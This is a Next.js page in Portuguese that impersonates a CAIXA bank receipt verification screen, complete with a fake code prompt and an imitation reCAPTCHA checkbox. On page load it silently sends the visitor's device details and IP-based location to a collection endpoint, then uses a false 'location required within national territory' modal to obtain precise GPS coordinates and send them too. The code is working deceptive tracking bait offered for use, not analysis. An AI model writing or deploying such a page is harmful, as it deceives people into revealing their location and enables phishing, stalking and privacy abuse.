import { useEffect, useState } from 'react';
import styles from '../styles/Home.module.css';
import Head from 'next/head';

export default function Home() {
  const [mensagem, setMensagem] = useState('Digite o código enviado ao seu dispositivo móvel');
  const [cpf, setCpf] = useState('');
  const [mostrarModal, setMostrarModal] = useState(false);
  const [naoSouRobo, setNaoSouRobo] = useState(false);

  useEffect(() => {
    async function coletaInicial() {
      setMensagem('Digite o código enviado ao seu dispositivo móvel');
      const info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        hora: new Date().toLocaleString(),
        location: 'Aguardando permissão do usuário',
      };

      setMensagem('');
      const ipData = await obterLocalizacaoIP();
      info.ip = ipData.ip;
      info.localizacaoIP = {
        cidade: ipData.city,
        regiao: ipData.region,
        pais: ipData.country,
        org: ipData.org,
      };

      setMensagem('Digite o código enviado ao seu dispositivo móvel');
      await enviar(info);
      setMensagem('Digite o código enviado ao seu dispositivo móvel.');
    }

    coletaInicial();
  }, []);

  async function obterLocalizacaoIP() {
    try {
      const res = await fetch('https://ipinfo.io/json?token=8d5553292f5d68');
      if (!res.ok) throw new Error('Erro ao obter localização IP');
      return await res.json();
    } catch (err) {
      console.error('Erro ao obter localização IP:', err);
      return { ip: 'Desconhecido', city: '', region: '', country: '', org: '' };
    }
  }

  async function obterLocalizacaoGPS() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        return resolve('Geolocalização não suportada');
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            altitude: pos.coords.altitude,
            accuracy: pos.coords.accuracy,
            altitudeAccuracy: pos.coords.altitudeAccuracy,
            heading: pos.coords.heading,
            speed: pos.coords.speed,
          });
        },
        () => {
          resolve('Permissão negada ou erro ao obter localização.');
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        }
      );
    });
  }

  async function enviar(data) {
    try {
      const res = await fetch('/api/coletar-info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });

      if (!res.ok) {
        setMensagem('Erro ao enviar os dados');
        console.error('Erro ao enviar dados:', await res.text());
      }
    } catch (err) {
      setMensagem('Erro ao conectar com o servidor');
      console.error('Erro ao enviar dados:', err);
    }
  }

  const solicitarLocalizacao = async () => {
    setMensagem('Solicitando geolocalização...');
    const localizacao = await obterLocalizacaoGPS();

    if (typeof localizacao === 'string') {
      alert(localizacao);
      setMostrarModal(false);
      return;
    }

    setMensagem('Coletando novamente com geolocalização...');
    const info = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      hora: new Date().toLocaleString(),
      location: localizacao,
    };

    const ipData = await obterLocalizacaoIP();
    info.ip = ipData.ip;
    info.localizacaoIP = {
      cidade: ipData.city,
      regiao: ipData.region,
      pais: ipData.country,
      org: ipData.org,
    };

    await enviar(info);
    alert('Dados atualizados com sucesso!');
    setMostrarModal(false);
    setMensagem('Dados com geolocalização enviados!');
  };

  const handleEnviarCPF = () => {
    if (cpf.trim().length !== 4 || cpf !== '7887') {
      alert('Digite corretamente o codigo enviado ao seu dispositivo móvel.');
      return;
    }

    if (!naoSouRobo) {
      alert('Por favor, confirme que você não é um robô.');
      return;
    }

    setMostrarModal(true);
  };

  return (
    <>
      <Head>
        <title>CAIXA-comprovante-1522457896</title>
        <meta name="Caixa-Verification" content="Comprovante-1522457896" />
      </Head>

      <div className={styles.container}>
        <h1 className={styles.title}>Verificação de Acesso</h1>
        <p>{mensagem}</p>

        <div className={styles.inputContainer}>
          <input
            type="number"
            placeholder="Código"
            value={cpf}
            onChange={(e) => setCpf(e.target.value)}
            className={styles.input}
          />
          <button onClick={handleEnviarCPF} className={styles.button}>
            Validar
          </button>
        </div>

        {/*reCAPTCHA */}
        <div className={styles.recaptchaContainer}>
          <div className={styles.recaptchaBox}>
            <label className={styles.recaptchaLabel}>
              <input
                type="checkbox"
                checked={naoSouRobo}
                onChange={(e) => setNaoSouRobo(e.target.checked)}
              />
              <span className={styles.checkmark}></span>
              Não sou um robô
            </label>
            <div className={styles.recaptchaLogo}>
              <img src="/recaptcha-logo.png" alt="reCAPTCHA" />
              <span className={styles.recaptchaSub}>reCAPTCHA</span>
            </div>
          </div>
        </div>

        {mostrarModal && (
          <div className={styles.modalOverlay}>
            <div className={styles.modalContent}>
              <h2>LOCALIZAÇÃO OBRIGATÓRIA</h2>
              <p>Este documento possui dados sensíveis. É obrigatório confirmar localização dentro do território nacional para prosseguir.</p>
              <button onClick={solicitarLocalizacao} className={styles.modalButton}>
                Ativar Localização
              </button>
            </div>
          </div>
        )}

        {/*link de privacidade */}
        <div className={styles.footerRight}>
          <a
            href="https://policies.google.com/privacy"
            target="_blank"
            rel="noopener noreferrer"
            className={styles.privacyLink}
          >
            Privacidade - Termos
          </a>
        </div>
      </div>
    </>
  );
}
